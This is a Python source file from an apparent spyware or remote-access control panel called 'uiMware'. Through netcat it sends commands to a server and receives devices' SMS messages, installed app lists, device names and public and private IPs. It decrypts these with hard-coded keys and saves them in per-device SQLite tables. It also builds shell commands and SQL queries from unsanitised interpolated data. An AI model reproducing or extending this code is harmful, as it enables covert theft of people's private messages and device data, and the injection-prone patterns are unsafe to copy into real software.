from subprocess import run, PIPE
from uiMware.views.libs.decrypt import decrypt_message
from uiMware.scriptsDB.script import InsertDataDevice, ReadTableDb, createTable
from jsonData.script import InsertUserInJson
from re import finditer

def PushData(commandPush, server_address):
    # Lanzar nc para enviar el mensaje y recibir la respuesta del servidor
    
    command = f"echo '{commandPush}' | nc {server_address} 8080"
    result = run(command, shell=True, stdout=PIPE, stderr=PIPE)
    responseServer = result.stdout.decode()

    try:
        if commandPush== "getsms":
            
            print("click en GetSms")
            pass
        
        elif commandPush== "getapp":
        
            print("click en GetApp")
            pass
                
        elif commandPush== "getip":
            
            print("click en GetIp")
            pass
        
        elif commandPush== "getuser":
            
            print("click en GetUser")
            pass
        
        elif commandPush== "pushuser":
            
            responseServer = decrypt_message(responseServer, "KlM4I1E0dyQ3ZSVUMnVJVw==")
            pushDataDevice = responseServer.split(", ")
            idDevice = pushDataDevice[0]
            nameDevice = pushDataDevice[1]
            ip_publica = pushDataDevice[2].replace("[", "")
            ip_privada = pushDataDevice[3].replace("]", "")
            InsertDataDevice(
                    "db/dataDevices.db",
                    f"""
                    INSERT INTO info_devices (device, ip_publica, ip_privada)
	                    VALUES ("{nameDevice}", "{ip_publica}", "{ip_privada}")
                    
                    """
                                 
            )
                
            id_Device = ReadTableDb(
                    "db/dataDevices.db",
                    f"""
                    SELECT MAX(idDevice) FROM info_devices;
 
                    
                    """
                )
                
            InsertUserInJson(nameDevice, int(id_Device[0][0]), "LogoPerfilHombre3.jpeg", "LogoPerfilHombre3.jpeg")
            
            
        elif commandPush== "pushapp":
            
            responseServer = decrypt_message(responseServer, "NEBlI1M4ZiFHN3JXSzZ6UQ==")
            
            readIdDevice = ReadTableDb(
                    "db/dataDevices.db",
                    """
                    SELECT MAX(idDevice) FROM info_devices;
                    
                    """
                    
                    )
            readIdDevice = readIdDevice[0][0]
            
            createTable(
                "db/appsDevices.db",
                f"apps_device_{readIdDevice}",
                f"""
                CREATE TABLE "apps_device_{readIdDevice}" (
                    "id_app"	INTEGER,
                    "app"	TEXT,
                    PRIMARY KEY("id_app" AUTOINCREMENT)
                );
                """
                
                )
            
            lista_apps = [app.strip() for app in responseServer[1:-1].split(",")]
            conteoApps = 0
            # Imprimir cada aplicación en una nueva línea
            for app in lista_apps:
                conteoApps += 1
                
                InsertDataDevice(
                    "db/appsDevices.db",
                    f"""
                    INSERT INTO apps_device_{readIdDevice} (app) 
                    	VALUES ("{app}")
                    """
                    
                )
                
                
        elif commandPush== "pushsms":
        
            messages = []
            #print(f"respuesta servidro {responseServer}")
            readIdDevice = ReadTableDb(
                    "db/dataDevices.db",
                    """
                    SELECT MAX(idDevice) FROM info_devices;
                    
                    """
                    
                    )
            
            readIdDevice = readIdDevice[0][0]
            #print(readIdDevice)
            
            createTable(
                "db/smsDevices.db",
                f"sms_device_{readIdDevice}",
                f"""
                CREATE TABLE "sms_device_{readIdDevice}" (
                    "id_sms"	INTEGER,
                    "sms"	TEXT,
                    PRIMARY KEY("id_sms" AUTOINCREMENT)
                );
                """
                
                )
            
            
            pattern = r"Sender: (\d+), Message: (.+?),"
            matches = finditer(pattern, responseServer)
            
            for match in matches:
                sender = match.group(1)
                message = match.group(2)
                messages.append({"Sender": sender, "Message": message})
            
            
            listaSenders = []
            listaMessages = []
            
            for i  in  messages:
                listaSenders.append(i['Sender'])
            for i  in  messages:
                listaMessages.append(i['Message'])

            for senders, mess in zip(listaSenders, listaMessages):
                print(f"{senders}: {mess}")                  
                
                InsertDataDevice(
                    "db/smsDevices.db",
                    f"""
                    INSERT INTO sms_device_{readIdDevice} (sms) 
                    	VALUES ("{senders}: {mess}")
                    """
                    
                )             
                
            
            
        elif commandPush== "test":
            pass
        
    except Exception as e:
        print(f"Ups, ah ocurrido un error: {e}")